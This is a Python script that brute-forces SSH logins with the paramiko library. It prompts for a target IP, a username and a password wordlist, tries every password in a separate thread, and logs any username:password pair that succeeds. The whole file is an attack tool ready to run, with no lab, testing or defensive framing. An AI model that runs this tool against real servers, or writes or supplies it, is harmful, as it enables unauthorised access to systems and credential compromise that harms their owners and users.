import paramiko
import threading
import logging
import sys

# Set up logging
logging.basicConfig(level=logging.INFO)

def ssh_bruteforce(target, user, wordlist):
    def try_login(password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=user, password=password)
            logging.info(f"Success: {user}:{password}")
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            logging.error(f"Error connecting: {e}")
            return False

    threads = []
    for password in wordlist:
        thread = threading.Thread(target=try_login, args=(password,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    try:
        target = input("Enter target IP: ")
        user = input("Enter username: ")
        wordlist_file = input("Enter path to password wordlist: ")
        
        with open(wordlist_file, "r") as file:
            wordlist = file.readlines()

        ssh_bruteforce(target, user, wordlist)

    except FileNotFoundError:
        logging.error("Wordlist file not found.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Error: {e}")
        sys.exit(1)
